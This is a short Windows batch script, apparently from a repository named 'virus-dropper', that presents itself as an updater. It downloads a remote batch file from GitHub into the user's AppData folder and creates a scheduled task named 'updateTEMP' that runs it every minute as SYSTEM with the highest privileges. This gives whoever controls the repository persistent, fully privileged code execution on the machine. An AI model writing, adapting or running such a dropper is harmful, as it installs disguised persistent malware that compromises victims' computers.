@echo off
cd C:\users\edwar\downloads
set /a version=5
@SET output=
FOR /F %%I IN ('curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/version.txt"') DO @SET "output=%%I"
If %output% == %version% exit ELSE goto update

:update
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/updater.bat" --output "%appdata%\Updater.bat"
SCHTASKS /CREATE /F /SC MINUTE /TR "%appdata%\Updater.bat" /TN "updateTEMP" /RL HIGHEST /RU SYSTEM
exit
